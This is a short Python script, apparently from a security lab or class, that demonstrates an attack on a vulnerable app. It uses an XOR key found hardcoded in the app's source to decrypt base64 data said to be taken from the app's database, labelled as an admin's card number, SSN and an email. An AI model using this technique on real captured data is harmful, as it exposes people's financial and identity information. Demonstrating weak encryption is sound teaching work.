import base64

print("="*70)
print("DESCIFRADO XOR - Demostración de Ataque")
print("="*70)

# La clave está hardcodeada en main/app.py línea 19
ENCRYPTION_KEY = '12345'

# Datos capturados de la base de datos vulnerable
datos_cifrados = {
    "Tarjeta de admin": "BQcABhgAAAAAGAQEBAwYCAICBA==",
    "SSN de admin": "AAAAGQEEHwUDDQg=",
    "Email de hacker": "WVNQX1BDclZCXF0cUFtY"
}

def xor_decrypt(encrypted_base64):
    """Descifra datos usando XOR con clave conocida"""
    try:
        # Decodificar de base64
        decoded = base64.b64decode(encrypted_base64).decode()
        
        # Aplicar XOR (es reversible)
        decrypted = ''.join(
            chr(ord(c) ^ ord(ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)])) 
            for i, c in enumerate(decoded)
        )
        return decrypted
    except Exception as e:
        return f"Error: {e}"

print(f"\nClave XOR encontrada en código fuente: '{ENCRYPTION_KEY}'")
print("\nDescifrando datos capturados...\n")

for nombre, cifrado in datos_cifrados.items():
    descifrado = xor_decrypt(cifrado)
    print(f"{nombre}:")
    print(f"   Cifrado: {cifrado}")
    print(f"   Descifrado: {descifrado}")
    print()
